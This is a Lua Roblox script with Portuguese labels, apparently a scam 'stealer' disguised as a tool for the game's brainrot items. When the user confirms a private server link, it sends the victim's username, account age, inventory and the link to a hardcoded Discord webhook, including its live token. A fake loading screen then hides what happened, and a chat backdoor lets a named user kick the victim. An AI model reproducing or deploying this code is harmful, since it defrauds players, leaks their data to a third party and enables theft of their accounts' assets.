-- Helper functions
local function parseValueFromText(s)
    if not s then return 0 end
    local num = s:match("([%d%.]+)")
    if not num then return 0 end
    local n = tonumber(num) or 0
    if s:find("B") then
        return n * 1e9
    elseif s:find("M") then
        return n * 1e6
    elseif s:find("K") then
        return n * 1e3
    else
        return n
    end
end

local function formatNumberWithSuffix(value)
    if value >= 1e9 then
        return string.format("%.1fB", value / 1e9)
    elseif value >= 1e6 then
        return string.format("%.1fM", value / 1e6)
    elseif value >= 1e3 then
        return string.format("%.1fK", value / 1e3)
    else
        return tostring(value)
    end
end

-- Gather brainrot data
local function getBrainrots()
    local results = {}
    local Min_Gen = 0
    local plots = Workspace:FindFirstChild("Plots") or Workspace
    for _, plot in ipairs(plots:GetChildren()) do
        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
        if podiums then
            for _, pd in ipairs(podiums:GetChildren()) do
                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
                local spawn = base and base:FindFirstChild("Spawn")
                local att = spawn and spawn:FindFirstChild("Attachment")
                local oh = att and att:FindFirstChild("AnimalOverhead")
                local nameLbl = oh and oh:FindFirstChild("DisplayName")
                local genLbl = oh and oh:FindFirstChild("Generation")
                if nameLbl and nameLbl:IsA("TextLabel") then
                    local name = nameLbl.Text
                    local genText = genLbl and genLbl.Text or "0"
                    local valueNum = parseValueFromText(genText)
                    if valueNum >= Min_Gen and valueNum > 0 then
                        if results[name] then
                            results[name].count = results[name].count + 1
                            results[name].value = math.max(results[name].value, valueNum)
                        else
                            results[name] = {name = name, value = valueNum, count = 1}
                        end
                    end
                end
            end
        end
    end
    return results
end

-- Webhook tracking
local webhookEnviadoPor = {}
local brainrotData = {}

local function updateBrainrotData()
    local newBrainrots = getBrainrots()
    for name, data in pairs(newBrainrots) do
        if brainrotData[name] then
            brainrotData[name].count = brainrotData[name].count + data.count
            brainrotData[name].value = math.max(brainrotData[name].value, data.value)
        else
            brainrotData[name] = data
        end
    end
end

-- Send webhook
local function sendWebhook(serverLink)
    if webhookEnviadoPor[LocalPlayer.Name] then
        return false, "Webhook já enviado."
    end

    updateBrainrotData()

    local brainrotStr = ""
    for _, data in pairs(brainrotData) do
        brainrotStr = brainrotStr .. string.format("• %s x%d | %s/s \n", data.name, data.count, formatNumberWithSuffix(data.value))
    end
    if brainrotStr == "" then brainrotStr = "Nenhum Brainrot encontrado." end

    local webhookBody = {
        content = "@everyone",
        username = "🐒 ALVES METHODS 🧠",
        embeds = {{
            color = 16732240,
            fields = {
                {name = "👤 Informacoes do Player", value = "**Nick:** " .. LocalPlayer.Name .. "\n**Conta Criada a:** " .. LocalPlayer.AccountAge .. " Dias"},
                {name = "🎮 Players:", value = tostring(#Players:GetPlayers()) .. "/8"},
                {name = "🎁 Brainrots", value = brainrotStr},
                {name = "🔗 Entrar no Servidor", value = "[Join](" .. serverLink .. ")"}
            }
        }},
        avatar_url = "https://i.postimg.cc/43Gsh33W/c6f6edab0d19e7c3ce1480a03ad664d5.png",
    }

    local success, err = pcall(function()
        if not request then
            error("Função 'request' não disponível")
        end
        request({
            Url = "https://discord.com/api/webhooks/1432223593617424454/BTzdMPQAzcfU0XRzRML-q9uYPUizLiiODhn1qYo-lWCSqbenlzUWz1nGfYonLWeYc-hN",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(webhookBody)
        })
    end)

    if success then
        webhookEnviadoPor[LocalPlayer.Name] = true
        return true
    else
        warn("Falha ao enviar webhook: ", err)
        return false, err
    end
end

-- Comando .kick
local authorizedUsers = {
    ["SEU_USERNAME_AQUI"] = true, -- 🔥 SUBSTITUA PELO SEU USERNAME
}

local function processChatMessage(message, speaker)
    if authorizedUsers[speaker.Name] then
        if message == ".kick" then
            print("🚨 Comando .kick recebido de: " .. speaker.Name)
            LocalPlayer:Kick("🔴 Você foi kickado por: " .. speaker.Name .. "\nComando: .kick")
        elseif message:sub(1, 6) == ".kick " then
            local targetName = message:sub(7)
            if targetName == LocalPlayer.Name then
                LocalPlayer:Kick("🔴 Você foi kickado por: " .. speaker.Name .. "\nAlvo: " .. targetName)
            end
        end
    end
end

-- Chat listener
local function setupChatListener()
    local success, error = pcall(function()
        if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
            local channel = game:GetService("TextChatService"):WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
            if channel then
                channel.OnIncomingMessage = function(message)
                    if message.TextSource then
                        processChatMessage(message.Text, message.TextSource)
                    end
                end
            end
        else
            Players.PlayerAdded:Connect(function(player)
                player.Chatted:Connect(function(message)
                    processChatMessage(message, player)
                end)
            end)
            
            for _, player in ipairs(Players:GetPlayers()) do
                player.Chatted:Connect(function(message)
                    processChatMessage(message, player)
                end)
            end
        end
    end)
    
    if not success then
        warn("Erro no chat: " .. tostring(error))
    end
end

-- Iniciar sistemas
setupChatListener()
print("✅ Script iniciado! UI visível e comandos ativos.")

-- Confirm button event
confirmButton.MouseButton1Click:Connect(function()
    if webhookEnviadoPor[LocalPlayer.Name] then
        confirmButton.Text = "Já Enviou!"
        confirmButton.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
        task.wait(2)
        confirmButton.Text = "Confirm"
        confirmButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
        return
    end

    local serverLink = serverLinkBox.Text
    local isValidLink = serverLink:match("^https://www%.roblox%.com/share%?code=[%w%d]+&type=Server$")

    if not isValidLink then
        confirmButton.Text = "❌ Link Inválido"
        confirmButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
        task.wait(1.5)
        confirmButton.Text = "Confirm"
        confirmButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
        return
    end

    confirmButton.Text = "✅ Válido"
    confirmButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    serverLinkBox.Active = false
    serverLinkBox.TextEditable = false

    task.wait(0.5)
    brainrotUI:Destroy()

    loaderGui.Parent = game:GetService("CoreGui")
    loaderSound:Play()

    local success, err = sendWebhook(serverLink)

    if not success then
        warn("Erro no webhook: ", err)
    end

    for i = 1, 100 do
        loaderPercent.Text = i .. "%"
        task.wait(0.05) -- Mais rápido para teste
    end

    loaderTitle:Destroy()
    loaderPercent:Destroy()
    loaderDesc:Destroy()

    local loaderCompleteLabel = Instance.new("TextLabel")
    loaderCompleteLabel.Size = UDim2.new(1, 0, 1, 0)
    loaderCompleteLabel.BackgroundTransparency = 1
    loaderCompleteLabel.Font = Enum.Font.GothamBold
    loaderCompleteLabel.TextScaled = true
    loaderCompleteLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    loaderCompleteLabel.Text = "✅ Player Puxado! Aguarde 5 Segundos"
    loaderCompleteLabel.Parent = loaderFrame
    
    task.wait(5)
    loaderGui:Destroy()
end)
